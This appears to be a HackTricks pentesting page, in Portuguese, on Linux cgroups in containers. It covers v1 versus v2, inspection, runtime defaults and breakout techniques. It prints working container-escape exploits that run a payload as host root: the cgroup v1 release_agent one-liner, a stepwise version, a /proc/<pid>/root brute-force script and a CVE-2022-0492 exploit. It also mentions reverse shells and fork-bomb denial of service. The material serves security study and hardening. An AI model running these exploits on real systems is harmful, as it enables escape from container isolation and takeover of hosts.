# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Visão geral

Linux **grupos de controle** são o mecanismo do kernel usado para agrupar processos para contabilização, limitação, priorização e aplicação de políticas. Se namespaces são principalmente sobre isolar a visão de recursos, cgroups tratam principalmente de governar **quanto** desses recursos um conjunto de processos pode consumir e, em alguns casos, **quais classes de recursos** eles podem interagir. Containers dependem de cgroups constantemente, mesmo quando o usuário nunca os vê diretamente, porque quase todo runtime moderno precisa de uma forma de dizer ao kernel "esses processos pertencem a esta carga de trabalho, e estas são as regras de recurso que se aplicam a eles".

É por isso que container engines colocam um novo container em sua própria subárvore de cgroup. Uma vez que a árvore de processos está lá, o runtime pode limitar memória, restringir o número de PIDs, ponderar o uso de CPU, regular I/O e restringir acesso a dispositivos. Em um ambiente de produção, isso é essencial tanto para segurança multi-tenant quanto para higiene operacional simples. Um container sem controles de recursos significativos pode esgotar a memória, inundar o sistema com processos ou monopolizar CPU e I/O de formas que tornem o host ou cargas de trabalho vizinhas instáveis.

Do ponto de vista de segurança, cgroups importam de duas maneiras distintas. Primeiro, limites de recursos ruins ou ausentes permitem ataques de negação de serviço simples. Segundo, algumas funcionalidades de cgroup, especialmente em configurações mais antigas de **cgroup v1**, historicamente criaram primitivos de breakout poderosos quando eram graváveis de dentro de um container.

## v1 Vs v2

Existem dois modelos principais de cgroup em uso. **cgroup v1** expõe múltiplas hierarquias de controladores, e writeups de exploits mais antigos frequentemente giram em torno das semânticas estranhas e às vezes excessivamente poderosas disponíveis ali. **cgroup v2** introduz uma hierarquia mais unificada e comportamento geralmente mais limpo. Distribuições modernas preferem cada vez mais cgroup v2, mas ambientes mistos ou legados ainda existem, o que significa que ambos os modelos continuam relevantes ao revisar sistemas reais.

A diferença importa porque algumas das histórias de breakout de container mais famosas, como abusos de **`release_agent`** em cgroup v1, estão vinculadas muito especificamente ao comportamento antigo dos cgroups. Um leitor que veja um exploit de cgroup num blog e então o aplique cegamente a um sistema moderno apenas com cgroup v2 provavelmente vai interpretar mal o que é realmente possível no alvo.

## Inspeção

A maneira mais rápida de ver onde seu shell atual se encontra é:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
O arquivo `/proc/self/cgroup` mostra os caminhos de cgroup associados ao processo atual. Em um host moderno com cgroup v2, você frequentemente verá uma entrada unificada. Em hosts mais antigos ou híbridos, você pode ver múltiplos caminhos de controladores v1. Uma vez que você conhece o caminho, pode inspecionar os arquivos correspondentes em `/sys/fs/cgroup` para ver limites e uso atual.

Em um host com cgroup v2, os comandos a seguir são úteis:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Estes arquivos revelam quais controladores existem e quais são delegados para child cgroups. Esse modelo de delegação é importante em ambientes rootless e gerenciados por systemd, onde o runtime pode apenas conseguir controlar o subconjunto da funcionalidade de cgroup que a hierarquia pai realmente delega.

## Laboratório

Uma maneira de observar cgroups na prática é executar um container com limite de memória:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Você também pode tentar um PID-limited container:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Esses exemplos são úteis porque ajudam a conectar a flag do runtime à interface de arquivos do kernel. O runtime não está aplicando a regra por mágica; ele escreve as configurações relevantes de cgroup e então deixa o kernel aplicá‑las contra a árvore de processos.

## Uso do runtime

Docker, Podman, containerd e CRI-O dependem de cgroups como parte do funcionamento normal. As diferenças geralmente não estão em se eles usam cgroups, mas em **quais padrões escolhem**, **como interagem com o systemd**, **como funciona a delegação em rootless**, e **quanto da configuração é controlada no nível do engine versus no nível da orquestração**.

No Kubernetes, solicitações e limites de recursos acabam se tornando configuração de cgroup no nó. O caminho do Pod YAML até a aplicação pelo kernel passa pelo kubelet, pelo CRI runtime e pelo OCI runtime, mas os cgroups continuam sendo o mecanismo do kernel que finalmente aplica a regra. Em ambientes Incus/LXC, cgroups também são muito usados, especialmente porque os system containers frequentemente expõem uma árvore de processos mais rica e expectativas operacionais mais parecidas com VMs.

## Misconfigurations And Breakouts

A história clássica de segurança de cgroup é o mecanismo gravável **cgroup v1** `release_agent`. Nesse modelo, se um atacante puder escrever nos arquivos de cgroup corretos, ativar `notify_on_release` e controlar o caminho armazenado em `release_agent`, o kernel pode acabar executando um caminho escolhido pelo atacante nos namespaces iniciais do host quando o cgroup ficar vazio. É por isso que publicações antigas dedicam tanta atenção à capacidade de escrita dos controladores de cgroup, às opções de montagem e às condições de namespace/capability.

Mesmo quando `release_agent` não está disponível, erros de cgroup ainda importam. Acesso excessivamente amplo a dispositivos pode tornar dispositivos do host alcançáveis a partir do container. Limites de memória e PID ausentes podem transformar uma simples execução de código em um DoS no host. Delegação fraca de cgroup em cenários rootless também pode levar defensores a supor que existe uma restrição quando o runtime na verdade nunca foi capaz de aplicá‑la.

### `release_agent` Background

A técnica `release_agent` aplica‑se apenas ao **cgroup v1**. A ideia básica é que, quando o último processo em um cgroup sai e `notify_on_release=1` está definido, o kernel executa o programa cujo caminho está armazenado em `release_agent`. Essa execução ocorre nos **namespaces iniciais no host**, o que transforma um `release_agent` gravável em um primitivo de escape de container.

Para que a técnica funcione, o atacante geralmente precisa de:

- uma hierarquia **cgroup v1** gravável
- a capacidade de criar ou usar um cgroup filho
- a capacidade de definir `notify_on_release`
- a capacidade de escrever um caminho em `release_agent`
- um caminho que resolva para um executável do ponto de vista do host

### PoC clássico

O PoC histórico em uma linha é:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Esta PoC escreve um caminho do payload em `release_agent`, aciona a liberação do cgroup e então lê o arquivo de saída gerado no host.

### Explicação legível

A mesma ideia é mais fácil de entender quando dividida em etapas.

1. Crie e prepare um cgroup gravável:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifique o caminho no host que corresponde ao container filesystem:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Solte um payload que será visível no caminho do host:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Acionar a execução esvaziando o cgroup:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
O efeito é a execução do payload no host com privilégios de root do host. Em um exploit real, o payload geralmente escreve um arquivo de prova, cria um reverse shell ou modifica o estado do host.

### Variante de caminho relativo usando `/proc/<pid>/root`

Em alguns ambientes, o caminho no host para o sistema de arquivos do container não é óbvio ou está oculto pelo storage driver. Nesse caso, o caminho do payload pode ser expresso através de `/proc/<pid>/root/...`, onde `<pid>` é um PID do host pertencente a um processo no container atual. Essa é a base da relative-path brute-force variant:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
O truque relevante aqui não é o brute force em si, mas a forma do caminho: `/proc/<pid>/root/...` permite que o kernel resolva um arquivo dentro do container filesystem a partir do host namespace, mesmo quando o caminho de armazenamento direto do host não é conhecido com antecedência.

### CVE-2022-0492 Variante

Em 2022, CVE-2022-0492 mostrou que escrever em `release_agent` em cgroup v1 não estava verificando corretamente `CAP_SYS_ADMIN` no **initial** user namespace. Isso tornou a técnica muito mais acessível em kernels vulneráveis porque um processo no container que pudesse montar uma hierarquia de cgroup poderia escrever em `release_agent` sem já ter privilégios no host user namespace.

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Em um kernel vulnerável, o host executa `/proc/self/exe` com privilégios de root do host.

Para abuso prático, comece verificando se o ambiente ainda expõe caminhos cgroup-v1 graváveis ou acesso a dispositivos perigosos:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Se `release_agent` estiver presente e gravável, você já está em território de legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Se o cgroup path em si não resultar em um escape, o próximo uso prático costuma ser denial of service ou reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Esses comandos informam rapidamente se a carga de trabalho tem espaço para fork-bomb, consumir memória agressivamente, ou abusar de uma interface legada de cgroup gravável.

## Verificações

Ao revisar um alvo, o objetivo das verificações de cgroup é descobrir qual modelo de cgroup está em uso, se o container enxerga caminhos de controladores graváveis, e se primitivas antigas de breakout como `release_agent` são sequer relevantes.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
O que é interessante aqui:

- Se `mount | grep cgroup` mostrar **cgroup v1**, breakout writeups mais antigos tornam-se mais relevantes.
- Se `release_agent` existir e for acessível, isso merece investigação mais profunda imediatamente.
- Se a hierarquia de cgroup visível for gravável e o container também tiver strong capabilities, o ambiente merece uma revisão muito mais detalhada.

Se você descobrir **cgroup v1**, pontos de montagem de controladores graváveis, e um container que também tenha strong capabilities ou proteção fraca por seccomp/AppArmor, essa combinação merece atenção cuidadosa. cgroups são frequentemente tratados como um tópico entediante de gerenciamento de recursos, mas historicamente eles fizeram parte de algumas das cadeias de escape de container mais instrutivas precisamente porque a fronteira entre "controle de recursos" e "influência no host" nem sempre foi tão clara quanto se supunha.

## Padrões de Runtime

| Runtime / platform | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Ativado por padrão | Containers são colocados em cgroups automaticamente; limites de recursos são opcionais, a menos que definidos por flags | omitindo `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Ativado por padrão | `--cgroups=enabled` é o padrão; os defaults do cgroup namespace variam por versão de cgroup (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, relaxed device access, `--privileged` |
| Kubernetes | Habilitado pelo runtime por padrão | Pods e containers são colocados em cgroups pelo runtime do nó; controle de recursos granular depende de `resources.requests` / `resources.limits` | omitir resource requests/limits, acesso privilegiado a dispositivos, misconfiguração do runtime a nível de host |
| containerd / CRI-O | Ativado por padrão | cgroups fazem parte do gerenciamento normal do ciclo de vida | configurações diretas do runtime que relaxam controles de dispositivos ou expõem interfaces legadas de cgroup v1 graváveis |

A distinção importante é que a **existência de cgroup** é geralmente padrão, enquanto **restrições de recursos úteis** são frequentemente opcionais, a menos que explicitamente configuradas.
{{#include ../../../../banners/hacktricks-training.md}}
